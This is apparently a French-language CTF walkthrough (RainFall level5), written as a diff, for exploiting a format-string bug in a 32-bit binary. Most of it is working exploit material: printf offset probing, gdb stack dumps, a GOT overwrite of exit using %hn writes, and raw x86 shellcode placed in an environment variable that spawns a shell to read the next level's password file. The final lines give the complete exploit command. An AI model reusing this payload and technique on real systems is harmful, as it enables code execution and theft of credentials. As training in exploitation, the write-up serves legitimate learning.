@@ -1,0 +1,78 @@
+- Apres analyse de l'asm, on remarque que le printf imprime le buffer recuperer avec fgets et
+qu'il y a un exit juste apres le printf
+- On va modifier la gpt pour que exit pointe vers un shellcode qui est dans l environement
+
+1) Determiner ou mettre des addresse memoire dans l'argument de printf
+
+
+ python -c 'print "AAAABBBB" + "%p." * 20' | ./level5
+
+AAAABBBB0x200.0xb7fd1ac0.0xb7ff37d0.0x41414141.0x42424242.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.
+
+==> On va voit que AAAA et BBBB sont le 4eme et 5eme argument
+
+2) Determiner l'adresse memoire du shellcode
+
+export TOTO=`python -c 'print "\x90" * 100 + "\x6a\x46\x58\x31\xdb\x31\xc9\xcd\x80\xeb\x21\x5f\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe6\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x57\x56\x53\x89\xe1\xcd\x80\xe8\xda\xff\xff\xffcat /home/user/level6/.pass; whoami; exit"'`
+
+gdb ./level5
+break *0x080484ff
+r < /tmp/test5
+x/1024xg $esp
+
+0xbffffe40:     0x6264672f6e69622f      0x6f682f3d44575000
+0xbffffe50:     0x2f726573752f656d      0x4c00356c6576656c
+0xbffffe60:     0x555f6e653d474e41      0x00382d4654552e53
+0xbffffe70:     0x9090903d4f544f54      0x9090909090909090
+0xbffffe80:     0x9090909090909090      0x9090909090909090
+0xbffffe90:     0x9090909090909090      0x9090909090909090
+0xbffffea0:     0x9090909090909090      0x9090909090909090
+0xbffffeb0:     0x9090909090909090      0x9090909090909090
+0xbffffec0:     0x9090909090909090      0x9090909090909090
+0xbffffed0:     0x9090909090909090      0xc931db3158466a90
+0xbffffee0:     0x580b6a5f21eb80cd      0xe689632d68665299
+0xbffffef0:     0x2f6868732f2f6852      0x565752e3896e6962
+0xbfffff00:     0xffdae880cde18953      0x682f20746163ffff
+
+=> Shellcode en 0xbfffeb0
+
+3) On determine l'adresse d exit
+
+level5@RainFall:~$ objdump -R ./level5
+
+./level5:     file format elf32-i386
+
+DYNAMIC RELOCATION RECORDS
+OFFSET   TYPE              VALUE
+08049838 R_386_JUMP_SLOT   exit
+
+
+4) L'injection sera de la forme :
+
+ (python -c 'print "\x38\x98\x04\x08" + "\x3a\x98\x04\x08" + "%p" * 5 + "%???x%4$hn%???x%5$hn"')
+
+5) Détermination des coeff de %x :
+
+0xfeb0 - 13 = 0xfea3 ====> 65187
+0x1bfff - 0xfeb0 = 0xc14f ====> 49487
+
+6) Verif avec gdb
+
+ (python -c 'print "\x38\x98\x04\x08" + "\x3a\x98\x04\x08" + "%p" * 5 + "%38955x%4$hn%28620x%5$hn"') > /tmp/test5
+
+
+Breakpoint 1, 0x080484ff in n ()
+(gdb) x/10xg 0x08049838
+0x8049838 <exit@got.plt>:       0xb7e453e0c025fed6      0x0000000000000000
+0x8049848 <stdin@@GLIBC_2.0>:   0x00000000b7fd1ac0      0x0000000000000000
+0x8049858:      0x0000000000000000      0x0000000000000000
+0x8049868:      0x0000000000000000      0x0000000000000000
+0x8049878:      0x0000000000000000      0x0000000000000000
+
+0xfed6 - 0xfeb0 = 0x26 ===> on soustrait 38 ====> 65149
+
+- Exploit :
+
+export TOTO=`python -c 'print "\x90" * 100 + "\x6a\x46\x58\x31\xdb\x31\xc9\xcd\x80\xeb\x21\x5f\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe6\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x57\x56\x53\x89\xe1\xcd\x80\xe8\xda\xff\xff\xffcat /home/user/level6/.pass; whoami; exit"'`
+
+(python -c 'print "\x38\x98\x04\x08" + "\x3a\x98\x04\x08" + "%p" * 5 + "%65149x%4$hn%49487x%5$hn"') | ./level5
